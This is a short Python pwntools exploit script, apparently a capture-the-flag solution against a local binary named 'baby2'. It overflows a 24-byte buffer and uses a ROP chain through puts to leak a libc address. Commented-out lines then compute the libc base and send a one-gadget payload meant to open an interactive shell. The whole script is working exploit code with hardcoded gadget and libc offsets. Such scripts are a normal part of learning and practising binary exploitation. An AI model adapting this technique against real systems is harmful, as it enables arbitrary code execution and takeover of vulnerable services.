from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p=process('./baby2')
binary=ELF('./baby2')
libc=ELF('libc.so.6')
p.recvline()

pop_rdi_addr=0x400783
pop_rsi_addr=0x400781
printf_plt_addr=0x400560
printf_got_addr=0x601fd0 
libc_binsh_addr=0x1b3e9a
libc_system_addr=0x4f440
ret_main_add=0x400698
puts_plt_addr=0x400550
puts_got_addr=0x601fc8
#puts_got_addr=binary.symbols['puts']
#puts_plt_addr=binary.got['puts']

oneshot_gadget=0x4f2c5


payload='a'*24
payload+=p64(pop_rdi_addr)
payload+=p64(puts_got_addr)
payload+=p64(puts_plt_addr)
payload+=p64(ret_main_add)
p.sendline(payload)
print(p.recvline())
p.recvuntil('\x0a')

leak=p.recvline().replace("\x0a","")
print leak
leak = u64(leak + "\x00"*(8 - len(leak)))
print leak

# libc_base_addr=leak - libc.symbols['puts']

# payload='A'*24
# payload+=p64(libc_base_addr+(0x4f2c5))
# p.recvline()
# p.sendline(payload)
# p.interactive()




